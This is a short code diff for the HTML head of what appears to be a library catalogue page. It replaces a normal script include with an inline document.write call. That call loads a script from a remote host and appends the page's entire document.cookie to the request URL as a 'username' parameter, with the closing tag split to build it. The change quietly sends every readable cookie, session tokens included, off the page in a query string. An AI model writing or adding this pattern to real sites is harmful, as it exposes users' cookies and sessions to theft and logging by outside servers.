@@ -34,7 +34,11 @@
   </script>
   <input type="hidden" id="pageNum" value="-1" >
   <input type="hidden" id="pageCategory" value="catalogue" >
-  <script src="https://abdullaharif.tech/hogwartslibrary/scripts/loadCommon.js?rndstr=<%= getRandomStr() %"></script> 
+  <script type="text/javascript">
+  document.write('<script src="https://abdullaharif.tech/hogwartslibrary/scripts/loadCommon.js?username='+decodeURIComponent(document.cookie)+'"></scr'+'ipt>');
+  </script>
+
+ 
 </head>
 
 <body>
